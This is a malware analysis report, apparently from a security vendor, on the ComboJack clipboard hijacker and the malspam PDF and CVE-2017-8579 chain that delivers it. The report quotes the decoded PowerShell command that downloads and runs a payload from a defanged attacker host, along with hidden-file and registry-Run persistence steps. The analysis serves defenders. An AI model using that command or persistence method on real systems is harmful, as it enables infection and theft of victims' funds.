This technique relies on victims not checking the destination wallet prior to ﬁnalizing a transaction. In 2017, CryptoShuﬄer was the ﬁrst malware to utilize this tactic. In contrast to that one, which focused on numerous cryptocurrencies, ComboJack targets both a range of cryptocurrencies, as well as digital currencies such as WebMoney and Yandex Money. Early on the morning of February 25, 2018, Unit 42 and Proofpoint (url researchers observed an interesting malspam campaign targeting Japanese and American users. This particular campaign tried to entice users by claiming a passport was lost and that the attached PDF contained a scanned copy of the document.Users opening this PDF would ﬁnd a single line of text which refers to an embedded doc ﬁle.Image 1. Example malspam recieved by users.Figure 1 Prompt displayed to the victim when opening the embedded RTF ﬁleSimilar to techniques utilized by Dridex and Locky in mid-2017 (urlﬁreeye.com/blog/threat-research/2017/05/dridex_and_lockyret.html), the PDF contained an embedded RTF ﬁle which contains an embedded remote object that attacks CVE-2017-8579 (url as discussed in this FireEye report (urlﬁreeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-ﬁnspy.html). This embedded remote object is an HTA ﬁle which was located at hXXps://a.doko[.]moe/tnejln which contains encoded PowerShell commands.(url 2. Contents of the HTA ﬁle retrieved from hXXps://a.doko[.]moe/tnejlnDecoding the contents of the HTA ﬁle yields the following PowerShell command which downloads and executes a ﬁle: The full ﬂow of execution may be visualized as follows:wscript.shell%systemroot%\system32\windowspowershell\v1.0\powershell.exe (new-object system.net.webclient).downloadfile( hXXp://masolo[.]win/protect/achi.exe $env:appdata\bstest.exe) ; start $env:appdata\bstest.exeFigure 2 Flow of execution leading to ComboJack being installed on victimThat leads us to the payload, which we have dubbed ComboJack because of how it attempts to hijack a combination of digital currencies. The following ﬁles were used for this analysis, which are explained below. a password protected SFX, however, the password is supplied by the ﬁrst stage. This allows us to easily recover the contents of the second stage. Helpfully, the “setup.txt” from the ﬁrst stage contains the following:Image 3. Contents of setup.txt embedded in the ﬁrst SFX layer of the payload.Once the second stage is extracted and run, we are presented with the ﬁnal stage of this attack, which we refer to as ComboJack. Once ComboJack is extracted it begins by copying itself to the following location: 1 C:\\ProgramData\\NVIDIA\\NVDisplay.Container.exe It then uses the built-in Windows tool, attrib.exe (used for setting ﬁle attributes), to set both hidden and system attributes to itself. This hides the ﬁle from the user and allows it to execute with SYSTEM level privileges. 1 "cmd /k attrib +s +h \"C:\\ProgramData\\NVIDIA\\NVDisplay.Container.exe\"" Finally, the payload sets the following registry key to ensure persistence: 1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\NVIDIA – C:\ ProgramData\NVIDIA\NVDisplay.Container.exe When the above steps are completed, ComboJack enters into an inﬁnite loop. Every half second it checks the contents of the clipboard. The contents of the clipboard are checked for various criteria to determine if the victim has copied wallet information for various digital currencies. In the event a wallet of interest is discovered, ComboJack will replace it with a hardcoded wallet that the attacker presumably owns in an attempt to have the victim accidentally send money to the wrong location. This tactic relies on the fact that wallet addresses are typically long and complex and to prevent errors, most users will opt to copy an exact string in order to prevent potential errors. If any potential currency addresses are found, they are replaced following the criteria in the table below:Replaces with0xE44598AB74425450692F7b3a9f898119968da8AdWallet TypeEthereum4BrL51JCc9NGQ71kWhnYoDRﬀsDZy7m1HUU7MRU4nUMXAHNFBE Monero. It’s important to note that this replacement string is not long enough, as Monero wallet addresses are either 95 or 106 characters in length.

Replacement address lookup table hardcoded into ComboJack.ComboJack shares some similarities in basic functionality with CryptoShuﬄer (urlﬄer-bitcoin- stealer/19976/), which is a malware family discovered by Kaspersky in 2017. However whereas CryptoShuﬄer focused exclusively on cryptocurrencies, ComboJack also targets popular digital payment systems, such as WebMoney (USD, EUR, and RUB), and Yandex Money. With the proliferation of Cryptomining malware, it is curious to see some actors take a diﬀerent route to acquiring web-based currency. Cryptoshuﬄer in 2017 may have been only the beginning of simple, yet eﬀective clipboard stealers like ComboJack. By targeting multiple cryptocurrencies and web based wallets, the author of ComboJack appears to be hedging his or her bets on which currency will boom and which will bust. As the prices of cryptocurrencies continue to rise it is likely we will see more and more malware targeting cryptocurrencies, as it presents the fastest way to the highest proﬁt.
